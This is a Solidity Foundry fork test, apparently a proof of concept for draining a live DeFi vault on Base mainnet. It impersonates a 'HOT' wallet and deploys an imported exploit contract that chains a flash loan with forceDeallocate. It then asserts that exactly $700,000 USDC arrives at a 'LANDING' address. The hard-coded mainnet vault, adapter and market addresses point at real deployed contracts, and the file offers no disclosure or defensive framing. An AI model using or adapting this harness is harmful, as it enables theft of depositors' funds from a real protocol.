// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {CrownForceDeallocateLand} from "../src/CrownForceDeallocateLand.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IVaultV2 {
    function forceDeallocatePenalty(address) external view returns (uint256);
    function totalAssets() external view returns (uint256);
}

/// @notice Fork-prove flash → forceDeallocate → Landing +$700k on live King V2 vault.
contract CrownForceDeallocateLandTest is Test {
    address constant HOT = 0x6708e21113922ED588bBCcAA5ef756BEcBb2a7d1;
    address constant LANDING = 0x5Adcea5319eA9Eac1241B95Ca53690574cFa2357;
    address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant RSS = 0x7a305D07B537359cf468eAea9bb176E5308bC337;
    address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address constant VAULT = 0xB96BcfFBB458581a3AF7fEd3150B7CD4b233A7b9;
    address constant ADAPTER = 0x3088de5b1629C518382a55e307b1bD45f3BFEE8c;
    bytes32 constant MID = 0x40ac09f34c5bc0b0b6d9b5f1ec1b97a6a149ff6278104797c9cb740453a2b794;

    uint256 constant ASK = 700_000e6;
    uint256 constant RSS_COLL = 2_000_000e18;

    function setUp() public {
        vm.createSelectFork(vm.envOr("RPC_URL", string("https://base-mainnet.public.blastapi.io")));
    }

    function test_ForceDeallocate_Landing700k() public {
        assertEq(IVaultV2(VAULT).forceDeallocatePenalty(ADAPTER), 0, "penalty");

        uint256 landBefore = IERC20(USDC).balanceOf(LANDING);
        console2.log("Landing before", landBefore);

        // Impersonate hot with its live RSS (or deal if hot RSS moves)
        uint256 hotRss = IERC20(RSS).balanceOf(HOT);
        if (hotRss < RSS_COLL) {
            deal(RSS, HOT, RSS_COLL);
        }

        vm.startPrank(HOT);
        CrownForceDeallocateLand ex =
            new CrownForceDeallocateLand(MORPHO, USDC, RSS, VAULT, ADAPTER, LANDING, HOT, MID);
        IERC20(RSS).approve(address(ex), RSS_COLL);
        ex.fire(ASK, RSS_COLL);
        vm.stopPrank();

        uint256 landAfter = IERC20(USDC).balanceOf(LANDING);
        uint256 delta = landAfter - landBefore;
        console2.log("Landing after", landAfter);
        console2.log("Landing delta", delta);
        console2.log("closed", ex.lastClosed());

        assertEq(delta, ASK, "Landing delta");
        assertTrue(ex.lastClosed(), "closed");
    }
}
